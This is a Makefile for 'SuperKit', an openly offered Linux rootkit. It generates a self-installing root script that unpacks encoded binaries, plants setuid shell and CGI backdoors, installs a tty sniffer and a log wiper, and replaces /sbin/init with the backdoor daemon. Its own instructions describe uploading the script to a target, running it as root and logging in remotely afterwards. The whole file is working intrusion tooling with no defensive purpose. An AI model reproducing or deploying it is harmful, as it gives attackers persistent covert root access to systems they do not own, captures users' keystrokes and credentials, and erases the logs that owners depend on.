#
#  $Id: Makefile, just a makefile, whatever

include config

INST	=	inst
D=`cat include/config.h | grep HOME | awk {'print $$3'}`

all:	install

help:
	@echo "Targets:"
	@echo "make skconfig - configure sk"
	@echo "make sk       - build sk & login binary"
	@echo "make help     - this help"
	@echo "make install  - create install script"

install:include/config.h sk 
	@(make -C $(BDORS) backsh)
	@(make -C $(BDORS) cgiback)
	@(make -C $(BDORS) izbtrag)
	@(make -C $(BDORS) sksniff)
	@echo "Creating install script"
	@echo "#!/bin/bash" > $(INST)
	@echo "D=`cat include/config.h | grep HOME | awk {'print $$3'}`" >> $(INST)
	@echo "H=`cat include/config.h | grep HIDESTR | awk {'print $$3'}`" >> $(INST)
	@echo "WIPER=`cat include/config.h | grep WIPER | awk {'print $$3'}`" >> $(INST)
	@echo "SHBDOR=`cat include/config.h | grep SHBDOR | awk {'print $$3'}`" >> $(INST)
	@echo "CGIBDOR=`cat include/config.h | grep CGIBDOR | awk {'print $$3'}`" >> $(INST)
	@echo "SKSNIFFBIN=`cat include/config.h | grep SKSNIFFBIN | awk {'print $$3'}`" >> $(INST)
	@echo "SKTTYLOG=`cat include/config.h | grep SKTTYLOG | awk {'print $$3'}`" >> $(INST)
	@echo "mkdir -p \$$D; cd \$$D" >> $(INST)
	@echo "echo > \$$SKTTYLOG; chmod 0622 \$$SKTTYLOG" >> $(INST)
	@echo "echo -n -e `gzip -9 -c sk | src/bin2oct` | gzip -d > sk" >> $(INST)
	@echo "echo -n -e `gzip -9 -c bdors/backsh | src/bin2oct` | gzip -d > \$$SHBDOR" >> $(INST)
	@echo "echo -n -e `gzip -9 -c bdors/cgiback.cgi | src/bin2oct` | gzip -d > \$$CGIBDOR" >> $(INST)
	@echo "echo -n -e `gzip -9 -c bdors/sksniff | src/bin2oct` | gzip -d > \$$SKSNIFFBIN" >> $(INST)
	@echo "echo -n -e `gzip -9 -c bdors/izbtrag| src/bin2oct` | gzip -d > \$$WIPER" >> $(INST)

	@echo "echo \"        _____                       __ __ _ __	\"" >> $(INST)
	@echo "echo \"       / ___/__  ______  ___  _____/ //_/(_) /_	\"" >> $(INST)
	@echo "echo \"       \__ \/ / / / __ \/ _ \/ ___/ ,<  / / __/	\"" >> $(INST)
	@echo "echo \"      ___/ / /_/ / /_/ /  __/ /  / /| |/ / /_	\"" >> $(INST)
	@echo "echo \"     /____/\__,_/ .___/\___/_/  /_/ |_/_/\__/	\"" >> $(INST)
	@echo "echo \"               /_/		by mostarac	\"" >> $(INST)
	@echo "echo \"     ------------------------------------------   \"" >> $(INST)
	@echo "echo \"                 INSTALLING SUPERKIT              \"" >> $(INST)
	@echo "echo \"     ------------------------------------------   \"" >> $(INST)
	@echo "echo \"     \"" >> $(INST)
	@echo "echo \"     -- Setting Permissions\"" >> $(INST)
	@echo "chmod 0755 sk;chmod 4755 \$$CGIBDOR;chmod 4755 \$$SHBDOR">> $(INST)
	@echo "chmod 0755 \$$SKSNIFFBIN;chmod 0755 \$$WIPER" >> $(INST)
	@echo "echo \"     -- Doing backdoors\"" >> $(INST)
	@echo "mv \$$SHBDOR /sbin" >> $(INST)
	@echo "if [ -d /var/www/cgi-bin ] ;" >> $(INST)
	@echo "then" >> $(INST)
	@echo "echo \"     ** Detected /var/www/cgi-bin dir\"" >> $(INST)
	@echo "echo \"     ** Backdoor is there as \$$CGIBDOR\"" >> $(INST)
	@echo "mv -f \$$CGIBDOR /var/www/cgi-bin/\$$CGIBDOR" >> $(INST)
	@echo "echo \"     ** Access it by surfing http://hostname/cgi-bin/\$$CGIBDOR\"" >> $(INST)
	@echo "else" >> $(INST)
	@echo "echo \"     !! Directory /var/www/cgi-bin NOT detected!\"" >> $(INST)
	@echo "echo \"     !! You have to manually place \$$CGIBDOR into cgi-bin directory\"" >> $(INST)
	@echo "echo \"     !! Example mv -f cgiback.cgi /path/cgi-bin/\$$CGIBDOR\"" >> $(INST)
	@echo "echo \"     !! Access it by surfing http://hostname/cgi-bin/\$$CGIBDOR\"" >> $(INST)
	@echo "fi" >> $(INST)
	@echo "echo \"     -- Installing sk backdoor deamon\"" >> $(INST)
	@echo "if [ ! -f /sbin/init\$${H} ]; then cp -f /sbin/init /sbin/init\$${H}; fi;" \
	"rm -f /sbin/init; cp sk /sbin/init" >> $(INST)
	@echo "echo \"     -- Executing sk binary\"" >> $(INST)
	@echo "\$$D/sk" >> $(INST)
	@echo "echo      ------------------------------------------     " >> $(INST)
	@echo "echo                  INSTALLATION COMPLETE              " >> $(INST)
	@echo "echo      ------------------------------------------     " >> $(INST)
	@echo
	@echo "echo Have fun!" >> $(INST)
	@chmod +x inst
	@clear
	@echo	"	   _____                       __ __ _ __	"
	@echo	"	  / ___/__  ______  ___  _____/ //_/(_) /_	"
	@echo	"	  \__ \/ / / / __ \/ _ \/ ___/ ,<  / / __/	"
	@echo	"	 ___/ / /_/ / /_/ /  __/ /  / /| |/ / /_	"
	@echo	"	/____/\__,_/ .___/\___/_/  /_/ |_/_/\__/	"
	@echo	"		  /_/					"
	@echo	"		    mostarac <mostar@hotmail.com>	"
	@echo	" 							"

	@echo "-------------------------------------------------------------------------------"
	@echo "Okay, file '$(INST)' is complete, self-installing script."
	@echo "Just upload it somewhere, execute it as root and your rootkit is installed."
	@echo "You can then enter the target box using login binary, ie. ./login -h target"
	@echo "Logcleaner is included and you can find it in your homedir $D ."
	@echo "First aid backdoors are also included, local shell backdoor and cgi backdoor."
	@echo "Binary login is not password-binded and can be used with all installations."
	@echo "Remember that compilation on target box is the optimal solution for superkit."
	@echo "You can edit your INST file and customize your rootkit again. Behave ;) ."
	@echo
	@echo "Have fun ;) 								      " 
	@echo "-------------------------------------------------------------------------------"

skconfig: clean src/pass
	@clear
	@src/pass >> include/config.h
	@echo
	@echo "Configuration saved."
	@echo "From now, ONLY this configuration will be used by generated"
	@echo "binaries till you do config again."
	@echo
	@echo "To (re)build all of stuff type 'make'"

include/config.h:
	@echo
	@echo Please do \`make skconfig\` in top level directory to generate configuration file.
	@echo
	@exit 1

sk:	include/config.h src/sk src/bin2oct login
	cp -f src/sk sk

login:	src/login
	cp -f src/login login

src/sk:	src include
	@(make -C $(SRC) )

src/login: src include
	@(make -C $(SRC) login)

src/pass: src include
	@(make -C $(SRC) pass)

src/bin2oct: src include
	@(make -C $(SRC) bin2oct)

bdors/backsh: bdors include
	@(make -C $(BDORS) backsh)

bdors/cgiback: bdors include
	@(make -C $(BDORS) cgiback)

bdors/izbtrag: bdors include
	@(make -C $(BDORS) izbtrag)

bdors/sksniff: bdors include
	@(make -C $(BDORS) sksniff)

clean:
	rm -f include/config.h sk login inst
	@(make -C $(SRC) clean )
	@(make -C $(BDORS) clean )

